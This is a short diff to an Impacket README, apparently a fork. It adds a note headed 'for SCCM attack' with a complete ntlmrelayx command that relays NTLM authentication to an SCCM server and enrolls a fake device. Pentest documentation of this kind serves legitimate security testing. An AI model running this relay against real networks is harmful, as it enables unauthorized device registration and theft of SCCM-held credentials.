@@ -1,3 +1,7 @@
+for SCCM attack:
+   python3 ntlmrelayx.py -t http://sccm-server2.domain.com/ccm_system_windowsauth/request --sccm --sccm-device RandomName --sccm-fqdn sccm-server2.domain.com --http-port 80 --sccm-server sccm-server2 --sccm-sleep 10 -smb2support
+
+
 Impacket
 ========
 
